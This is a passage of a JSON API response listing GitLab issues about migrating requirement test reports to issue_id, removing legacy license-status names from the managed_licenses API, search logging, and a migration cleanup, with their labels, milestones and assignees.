Artur","state":"active","avatar_url":"https://secure.gravatar.com/avatar/dbad92659914f56621cbdd726e283e60?s=80\u0026d=identicon","web_url":"https://gitlab.com/felipe_artur"},"type":"ISSUE","assignee":{"id":426128,"username":"felipe_artur","name":"Felipe Artur","state":"active","avatar_url":"https://secure.gravatar.com/avatar/dbad92659914f56621cbdd726e283e60?s=80\u0026d=identicon","web_url":"https://gitlab.com/felipe_artur"},"user_notes_count":2,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/345844","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/345844","notes":"https://gitlab.com/api/v4/projects/278964/issues/345844/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/345844/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#345844","relative":"#345844","full":"gitlab-org/gitlab#345844"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7148,"epic":{"id":388159,"iid":7148,"title":"Migrate test reports to belong to work items","url":"/groups/gitlab-org/-/epics/7148","group_id":9970,"human_readable_end_date":"May 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":97440118,"iid":345842,"project_id":278964,"title":"Deprecate test report relationship with requirement","description":"Remove usage/references to `RequirementsManagement::Requirement` association on `RequirementsManagement::TestReport` model.     \n\n`RequirementsManagement::Requirement` will be deprecated and we should be using the associated issue instead.  \n\nAlso, it is important to add `NOT NULL` constraint to `requirements_management_test_reports.issue_id` column at DB and model level.","state":"closed","created_at":"2021-11-16T18:27:53.043Z","updated_at":"2023-01-12T21:24:50.606Z","closed_at":"2022-03-02T13:53:13.062Z","closed_by":{"id":426128,"username":"felipe_artur","name":"Felipe Artur","state":"active","avatar_url":"https://secure.gravatar.com/avatar/dbad92659914f56621cbdd726e283e60?s=80\u0026d=identicon","web_url":"https://gitlab.com/felipe_artur"},"labels":["Category:Requirements Management","backend","devops::plan","group::certify","section::dev","type::maintenance","workflow::in review"],"milestone":{"id":2204140,"iid":71,"group_id":9970,"title":"14.9","description":"","state":"active","created_at":"2021-08-26T19:11:46.841Z","updated_at":"2022-03-22T13:29:17.028Z","due_date":"2022-03-17","start_date":"2022-02-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/71"},"assignees":[{"id":426128,"username":"felipe_artur","name":"Felipe Artur","state":"active","avatar_url":"https://secure.gravatar.com/avatar/dbad92659914f56621cbdd726e283e60?s=80\u0026d=identicon","web_url":"https://gitlab.com/felipe_artur"}],"author":{"id":426128,"username":"felipe_artur","name":"Felipe Artur","state":"active","avatar_url":"https://secure.gravatar.com/avatar/dbad92659914f56621cbdd726e283e60?s=80\u0026d=identicon","web_url":"https://gitlab.com/felipe_artur"},"type":"ISSUE","assignee":{"id":426128,"username":"felipe_artur","name":"Felipe Artur","state":"active","avatar_url":"https://secure.gravatar.com/avatar/dbad92659914f56621cbdd726e283e60?s=80\u0026d=identicon","web_url":"https://gitlab.com/felipe_artur"},"user_notes_count":11,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/345842","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/345842","notes":"https://gitlab.com/api/v4/projects/278964/issues/345842/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/345842/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#345842","relative":"#345842","full":"gitlab-org/gitlab#345842"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7148,"epic":{"id":388159,"iid":7148,"title":"Migrate test reports to belong to work items","url":"/groups/gitlab-org/-/epics/7148","group_id":9970,"human_readable_end_date":"May 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":97440065,"iid":345841,"project_id":278964,"title":"Populate test reports issue_id column","description":"After https://gitlab.com/gitlab-org/gitlab/-/issues/345840 `test_reports.issue_id` is \nbeing filled when creating new test reports.  \n\nNow we can populate old test reports records `issue_id` with the parent requirement associated issue id:\n\nIn ruby words:\n\n``` ruby\ntest_report.issue_id = test_report.requirement.requirement_issue.id\n```\n\nThis can be done with a background migration.","state":"closed","created_at":"2021-11-16T18:26:22.477Z","updated_at":"2023-01-12T21:24:50.558Z","closed_at":"2022-02-01T17:24:15.164Z","closed_by":{"id":426128,"username":"felipe_artur","name":"Felipe Artur","state":"active","avatar_url":"https://secure.gravatar.com/avatar/dbad92659914f56621cbdd726e283e60?s=80\u0026d=identicon","web_url":"https://gitlab.com/felipe_artur"},"labels":["Category:Requirements Management","backend","devops::plan","group::certify","missed:14.7","section::dev","type::maintenance","workflow::verification"],"milestone":{"id":2161849,"iid":70,"group_id":9970,"title":"14.8","description":"","state":"active","created_at":"2021-07-26T16:51:47.677Z","updated_at":"2021-07-26T16:51:47.677Z","due_date":"2022-02-17","start_date":"2022-01-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/70"},"assignees":[{"id":426128,"username":"felipe_artur","name":"Felipe Artur","state":"active","avatar_url":"https://secure.gravatar.com/avatar/dbad92659914f56621cbdd726e283e60?s=80\u0026d=identicon","web_url":"https://gitlab.com/felipe_artur"}],"author":{"id":426128,"username":"felipe_artur","name":"Felipe Artur","state":"active","avatar_url":"https://secure.gravatar.com/avatar/dbad92659914f56621cbdd726e283e60?s=80\u0026d=identicon","web_url":"https://gitlab.com/felipe_artur"},"type":"ISSUE","assignee":{"id":426128,"username":"felipe_artur","name":"Felipe Artur","state":"active","avatar_url":"https://secure.gravatar.com/avatar/dbad92659914f56621cbdd726e283e60?s=80\u0026d=identicon","web_url":"https://gitlab.com/felipe_artur"},"user_notes_count":6,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/345841","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":3,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/345841","notes":"https://gitlab.com/api/v4/projects/278964/issues/345841/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/345841/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#345841","relative":"#345841","full":"gitlab-org/gitlab#345841"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7148,"epic":{"id":388159,"iid":7148,"title":"Migrate test reports to belong to work items","url":"/groups/gitlab-org/-/epics/7148","group_id":9970,"human_readable_end_date":"May 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":97440046,"iid":345840,"project_id":278964,"title":"Fill issue_id column when creating test reports","description":"Populate `test_reports.issue_id` when creating a new test report with the parent requirement associated issue id. \n\nIn ruby words, after creating a requirement we should:  \n\n``` ruby\ntest_report.issue_id = test_report.requirement.requirement_issue.id\n\n```\n\nTo achieve this we need to remove `requirements_test_reports_requirement_id_xor_issue_id` constraint  \nwhich allows only `issue_id` or `requirement_id` being present.  After removing the constraint we should populate both `issue_id` and `requirement_id`.\n\nThe old `requirement_id` association will be removed on https://gitlab.com/gitlab-org/gitlab/-/issues/345845.","state":"closed","created_at":"2021-11-16T18:25:37.366Z","updated_at":"2023-01-12T21:24:50.504Z","closed_at":"2021-12-15T16:36:15.065Z","closed_by":{"id":426128,"username":"felipe_artur","name":"Felipe Artur","state":"active","avatar_url":"https://secure.gravatar.com/avatar/dbad92659914f56621cbdd726e283e60?s=80\u0026d=identicon","web_url":"https://gitlab.com/felipe_artur"},"labels":["Category:Requirements Management","Deliverable","backend","devops::plan","group::certify","section::dev","type::maintenance","workflow::verification"],"milestone":{"id":2114820,"iid":67,"group_id":9970,"title":"14.6","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-06-23T05:00:52.094Z","updated_at":"2022-04-21T07:26:38.271Z","due_date":"2021-12-17","start_date":"2021-11-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/67"},"assignees":[{"id":426128,"username":"felipe_artur","name":"Felipe Artur","state":"active","avatar_url":"https://secure.gravatar.com/avatar/dbad92659914f56621cbdd726e283e60?s=80\u0026d=identicon","web_url":"https://gitlab.com/felipe_artur"}],"author":{"id":426128,"username":"felipe_artur","name":"Felipe Artur","state":"active","avatar_url":"https://secure.gravatar.com/avatar/dbad92659914f56621cbdd726e283e60?s=80\u0026d=identicon","web_url":"https://gitlab.com/felipe_artur"},"type":"ISSUE","assignee":{"id":426128,"username":"felipe_artur","name":"Felipe Artur","state":"active","avatar_url":"https://secure.gravatar.com/avatar/dbad92659914f56621cbdd726e283e60?s=80\u0026d=identicon","web_url":"https://gitlab.com/felipe_artur"},"user_notes_count":2,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/345840","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/345840","notes":"https://gitlab.com/api/v4/projects/278964/issues/345840/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/345840/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#345840","relative":"#345840","full":"gitlab-org/gitlab#345840"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7148,"epic":{"id":388159,"iid":7148,"title":"Migrate test reports to belong to work items","url":"/groups/gitlab-org/-/epics/7148","group_id":9970,"human_readable_end_date":"May 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":97437845,"iid":345839,"project_id":278964,"title":"[15.0] Remove  legacy approval status names from `managed_licenses` API","description":"### Proposal \n\nWith #335707 we deprecated `blacklisted` and `approved` statuses in `managed_licenses` API, now we need to remove them\n\nannouncement https://about.gitlab.com/blog/2021/12/13/composition-analysis-group-deprecations/\n\nhttps://docs.gitlab.com/ee/update/deprecations.html#legacy-approval-status-names-from-license-compliance-api\n\n### Implementation plan\n\n1. In [managed_licenses](https://gitlab.com/gitlab-org/gitlab/blob/8ea9b0e2a15db8c9e8728d79c2df4db431efca41/ee/lib/api/managed_licenses.rb#L64) api file remove mention of `blacklisted` and `approved` statuses as request params.\n1. Enable `lc_remove_legacy_approval_status` feature flag to get new statuses in API response.\n1. Update [documentation](https://docs.gitlab.com/ee/api/managed_licenses.html) and remove mention of `“approved” or “blacklisted”` statuses as params.\n\n### Testing\n\nSET to update the appropriate E2E Browser UI test for licence compliance when feature flag rolls out.","state":"closed","created_at":"2021-11-16T17:30:52.707Z","updated_at":"2022-12-29T03:09:10.560Z","closed_at":"2022-05-12T17:13:52.290Z","closed_by":{"id":1378158,"username":"brytannia","name":"Tetiana Chupryna","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1378158/avatar.png","web_url":"https://gitlab.com/brytannia"},"labels":["Category:License Compliance","Deliverable","Enterprise Edition","GitLab Ultimate","api","backend","deprecation","devops::secure","group::composition analysis","maintenance::removal","quad-planning::complete-action","release post item","release post item::in review","section::sec","type::maintenance","workflow::verification"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":1378158,"username":"brytannia","name":"Tetiana Chupryna","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1378158/avatar.png","web_url":"https://gitlab.com/brytannia"}],"author":{"id":1378158,"username":"brytannia","name":"Tetiana Chupryna","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1378158/avatar.png","web_url":"https://gitlab.com/brytannia"},"type":"ISSUE","assignee":{"id":1378158,"username":"brytannia","name":"Tetiana Chupryna","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/1378158/avatar.png","web_url":"https://gitlab.com/brytannia"},"user_notes_count":5,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/345839","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/345839","notes":"https://gitlab.com/api/v4/projects/278964/issues/345839/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/345839/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#345839","relative":"#345839","full":"gitlab-org/gitlab#345839"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":7393,"epic":{"id":421331,"iid":7393,"title":"License Compliance terminology migration","url":"/groups/gitlab-org/-/epics/7393","group_id":9970,"human_readable_end_date":"Jun 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":"on_track"},{"id":97434249,"iid":345831,"project_id":278964,"title":"Add a search_level field to logging","description":"\u003c!-- This template is a great use for issues that are feature::additions or technical tasks for larger issues.--\u003e\n\n### Proposal\n\n\u003c!-- Use this section to explain the feature and how it will work. It can be helpful to add technical details, design proposals, and links to related epics or issues. --\u003e\n\n\u003c!-- Consider adding related issues and epics to this issue. You can also reference the Feature Proposal Template (https://gitlab.com/gitlab-org/gitlab/-/blob/master/.gitlab/issue_templates/Feature%20proposal%20-%20detailed.md) for additional details to consider adding to this issue. Additionally, as a data oriented organization, when your feature exits planning breakdown, consider adding the `What does success look like, and how can we measure that?` section.\n--\u003e\n\nRelated to https://gitlab.com/gitlab-org/gitlab/-/issues/332631/\n\nCurrently `group_id` and `project_id` fields are logged when searches are performed via [`search_controller.rb` method `append_info_to_payload`](app/controllers/search_controller.rb#L139). We will soon add `project_ids` when multi-select project search is introduced. Unfortunately, we sometimes see the tracking fields are present but empty which makes analysis using Kibana more difficult. We could add a new tracking field `search_level` that determines which type of search is being performed: `global`, `group`, `project`, and `multi-project`. This would make log analysis a LOT easier and less prone to issues with blank but present fields.\n\n\u003c!-- Label reminders\nUse the following resources to find the appropriate labels:\n- https://gitlab.com/gitlab-org/gitlab/-/labels\n- https://about.gitlab.com/handbook/product/categories/features/\n--\u003e","state":"closed","created_at":"2021-11-16T16:23:53.309Z","updated_at":"2022-05-30T16:00:43.009Z","closed_at":"2022-02-17T17:02:33.263Z","closed_by":{"id":4888751,"username":"changzhengliu","name":"Changzheng Liu","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4888751/avatar.png","web_url":"https://gitlab.com/changzhengliu"},"labels":["Category:Global Search","Community contribution","[deprecated] Accepting merge requests","backend","devops::data_stores","group::global search","needs weight","section::enablement","type::feature","workflow::in dev"],"milestone":{"id":2161849,"iid":70,"group_id":9970,"title":"14.8","description":"","state":"active","created_at":"2021-07-26T16:51:47.677Z","updated_at":"2021-07-26T16:51:47.677Z","due_date":"2022-02-17","start_date":"2022-01-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/70"},"assignees":[],"author":{"id":5708766,"username":"terrichu","name":"Terri Chu","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5708766/avatar.png","web_url":"https://gitlab.com/terrichu"},"type":"ISSUE","assignee":null,"user_notes_count":6,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/345831","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/345831","notes":"https://gitlab.com/api/v4/projects/278964/issues/345831/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/345831/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#345831","relative":"#345831","full":"gitlab-org/gitlab#345831"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":97434171,"iid":345830,"project_id":278964,"title":"Cleanup Issue WorkItemType ID backfill MR","description":"https://gitlab.com/gitlab-org/gitlab/-/merge_requests/71869 introduced 2 temporary solutions to make the data migration perform better. After that change is released we should perform a a couple of cleanup actions on the next release:\n- Run `ensure_batched_background_migration_is_finished` for each of the background migrations\n- Remove temporary index `tmp_index_issues_on_issue_type_and_id`\n- Add foreign key index back to issues table on the `work_item_type_id` column","state":"closed","created_at":"2021-11-16T16:21:58.353Z","updated_at":"2022-12-21T12:01:50.106Z","closed_at":"2022-12-13T20:58:31.908Z","closed_by":{"id":8110537,"username":"mcelicalderonG","name":"Mario Celi","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8110537/avatar.png","web_url":"https://gitlab.com/mcelicalderonG"},"labels":["Deliverable","auto updated","backend","devops::plan","group::project management","missed-deliverable","missed:14.6","section::dev","type::maintenance","workflow::production"],"milestone":{"id":2717597,"iid":82,"group_id":9970,"title":"15.7","description":"","state":"active","created_at":"2022-07-29T14:48:31.199Z","updated_at":"2022-07-29T14:48:31.199Z","due_date":"2022-12-17","start_date":"2022-11-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/82"},"assignees":[{"id":8110537,"username":"mcelicalderonG","name":"Mario Celi","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8110537/avatar.png","web_url":"https://gitlab.com/mcelicalderonG"}],"author":{"id":8110537,"username":"mcelicalderonG","name":"Mario Celi","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8110537/avatar.png","web_url":"https://gitlab.com/mcelicalderonG"},"type":"ISSUE","assignee":{"id":8110537,"username":"mcelicalderonG","name":"Mario Celi","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/8110537/avatar.png","web_url":"https://gitlab.com/mcelicalderonG"},"user_notes_count":4,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/345830","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/345830","notes":"https://gitlab.com/api/v4/projects/278964/issues/345830/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/345830/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#345830","relative":"#345830","full":"gitlab-org/gitlab#345830"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null}]